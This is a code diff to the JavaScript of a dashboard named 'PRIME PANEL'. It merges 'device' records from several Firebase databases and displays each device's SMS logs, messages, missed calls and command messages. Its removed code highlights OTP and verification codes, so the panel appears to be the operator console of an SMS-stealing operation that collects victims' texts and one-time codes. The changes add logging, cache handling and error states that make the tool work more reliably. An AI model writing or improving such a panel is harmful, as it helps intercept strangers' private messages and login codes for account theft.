@@ -632,7 +632,7 @@
 
 <script>
     // ===== FIREBASE CONFIG =====
-    // All database sources
+    // All database sources with correct paths
     const SOURCES = [
         { id: 'primary', url: 'https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app', path: 'users', messagesPath: 'users' },
         { id: 'annu', url: 'https://annu-f0207-default-rtdb.firebaseio.com/', path: 'clients', messagesPath: 'messages' },
@@ -654,6 +654,7 @@
     let searchQuery = '';
     let isInitialLoad = true;
     let messageCache = {};
+    let loadingComplete = false;
 
     // ===== TOAST =====
     function showToast(msg) {
@@ -737,13 +738,12 @@
 
     function getSmsCount(userData) {
         if (!userData) return 0;
-        if (userData.sms_logs) {
-            return Object.keys(userData.sms_logs).length;
-        }
-        // Check if we have messages cached for this device
         const compositeId = userData._compositeId;
         if (compositeId && messageCache[compositeId]) {
             return Object.keys(messageCache[compositeId]).length;
+        }
+        if (userData.sms_logs) {
+            return Object.keys(userData.sms_logs).length;
         }
         let count = 0;
         if (userData.message) count++;
@@ -754,7 +754,6 @@
 
     function getLatestSms(userData) {
         if (!userData) return null;
-        // Check cached messages first
         const compositeId = userData._compositeId;
         if (compositeId && messageCache[compositeId]) {
             const entries = Object.entries(messageCache[compositeId]);
@@ -784,7 +783,6 @@
         let messages = [];
         const compositeId = userData._compositeId;
         
-        // Check cached messages first (from /messages endpoint)
         if (compositeId && messageCache[compositeId]) {
             const entries = Object.entries(messageCache[compositeId]);
             entries.sort((a, b) => {
@@ -802,13 +800,11 @@
             return messages;
         }
         
-        // Fallback to sms_logs
         if (userData.sms_logs) {
             const entries = Object.entries(userData.sms_logs);
             entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
             messages = entries.map(e => ({ id: e[0], ...e[1] }));
         }
-        // Add command messages
         if (userData.message) {
             messages.push({ id: 'cmd1', sender: 'command', message: userData.message, timestamp: Date.now() });
         }
@@ -854,14 +850,14 @@
     function fetchSourceData(source) {
         return new Promise((resolve) => {
             const app = initFirebaseApp(source);
-            if (!app) return resolve({ source, data: null, messages: null });
+            if (!app) return resolve({ source, data: null });
 
             const db = firebase.database(app);
-            
-            // Fetch clients data
             const ref = db.ref(source.path);
+            
             ref.once('value', (snapshot) => {
-                resolve({ source, data: snapshot.val() });
+                const data = snapshot.val();
+                resolve({ source, data: data });
             }, (err) => {
                 console.error('Error fetching', source.id, err);
                 resolve({ source, data: null });
@@ -888,9 +884,9 @@
     // ===== MAIN FETCH =====
     async function fetchAllData() {
         const btn = document.getElementById('refreshBtn');
-        const loading = document.getElementById('devicesGrid');
+        const grid = document.getElementById('devicesGrid');
         btn.disabled = true;
-        loading.innerHTML = '<div class="loading"><div class="spinner"></div>Loading devices...</div>';
+        grid.innerHTML = '<div class="loading"><div class="spinner"></div>Loading devices...</div>';
 
         try {
             // Fetch from all sources
@@ -901,10 +897,17 @@
             const mergedData = {};
             const messagePromises = [];
 
+            let totalDevices = 0;
+
             for (const result of results) {
-                if (!result.data) continue;
+                if (!result.data) {
+                    console.warn('No data for source:', result.source.id);
+                    continue;
+                }
                 const sourceId = result.source.id;
                 const data = result.data;
+                
+                console.log(`Source ${sourceId} has ${Object.keys(data).length} devices`);
                 
                 for (const deviceId in data) {
                     const compositeId = `${sourceId}::${deviceId}`;
@@ -914,6 +917,7 @@
                         _deviceId: deviceId,
                         _compositeId: compositeId
                     };
+                    totalDevices++;
                     
                     // Queue message fetch for this device
                     const source = SOURCES.find(s => s.id === sourceId);
@@ -927,15 +931,27 @@
                 }
             }
 
+            console.log(`Total devices found: ${totalDevices}`);
+
             // Fetch all messages in parallel
             const messageResults = await Promise.all(messagePromises);
+            let messagesLoaded = 0;
             for (const result of messageResults) {
                 if (result.messages) {
                     messageCache[result.compositeId] = result.messages;
+                    messagesLoaded++;
                 }
             }
+            console.log(`Messages loaded for ${messagesLoaded} devices`);
 
             allUsers = mergedData;
+            
+            if (Object.keys(allUsers).length === 0) {
+                grid.innerHTML = '<div class="loading">❌ No devices found in any database</div>';
+                btn.disabled = false;
+                return;
+            }
+
             renderDevices();
             if (selectedDeviceId && allUsers[selectedDeviceId]) {
                 renderInbox();
@@ -950,9 +966,11 @@
                 }
             }
 
+            showToast(`✅ Loaded ${Object.keys(allUsers).length} devices from ${SOURCES.length} databases`);
+
         } catch (error) {
             console.error('Fetch error:', error);
-            loading.innerHTML = `
+            grid.innerHTML = `
                 <div class="loading">❌ Error: ${escapeHtml(error.message)}<br>
                 <button onclick="fetchAllData()" style="margin-top:8px;background:rgba(79,195,247,0.15);color:#4fc3f7;border:1px solid rgba(79,195,247,0.3);padding:6px 16px;border-radius:6px;cursor:pointer;">Retry</button></div>
             `;
@@ -1081,39 +1099,6 @@
             return;
         }
 
-        if (newMessageId) {
-            const newSms = smsList.find(s => s.id === newMessageId);
-            if (newSms) {
-                const div = document.createElement('div');
-                div.className = 'inbox-message new-message';
-                const sender = newSms.sender || 'Unknown';
-                const isOTP = /otp|code|verification/i.test(newSms.message);
-                let bodyHtml = escapeHtml(newSms.message || '');
-                
-                if (isOTP) {
-                    const otpMatch = newSms.message.match(/\b\d{4,6}\b/);
-                    if (otpMatch) {
-                        bodyHtml = bodyHtml.replace(otpMatch[0], `<span class="otp-code">${otpMatch[0]}</span>`);
-                    }
-                }
-
-                div.innerHTML = `
-                    <div class="msg-header">
-                        <span class="msg-sender">📨 ${escapeHtml(sender)}</span>
-                        <span class="msg-time">${parseTimestamp(newSms.timestamp)}</span>
-                    </div>
-                    <div class="msg-body ${isOTP ? 'highlight' : ''}">${bodyHtml}</div>
-                `;
-                
-                container.prepend(div);
-                container.scrollTop = 0;
-                document.getElementById('newMsgDot').classList.add('show');
-                updateDeviceCardSmsCount(selectedDeviceId);
-                updateStats();
-                return;
-            }
-        }
-
         container.innerHTML = '';
 
         notifList.forEach(notif => {
@@ -1143,7 +1128,6 @@
                 }
             }
 
-            // Check if it's a missed call notification
             const isMissedCall = sms.message && sms.message.includes('missed call');
             const typeLabel = sms.type === 'outgoing' ? '📤 Outgoing' : 
                             isMissedCall ? '📞 Missed Call' : 
@@ -1204,11 +1188,16 @@
 
     function manualRefresh() {
         showToast('🔄 Refreshing data...');
+        // Clear cache and reload
+        messageCache = {};
         fetchAllData();
     }
 
     // ===== INIT =====
     document.addEventListener('DOMContentLoaded', () => {
+        // Open browser console to see debug logs
+        console.log('🔍 PRIME PANEL starting...');
+        console.log(`📡 Loading from ${SOURCES.length} databases`);
         fetchAllData();
     });
 
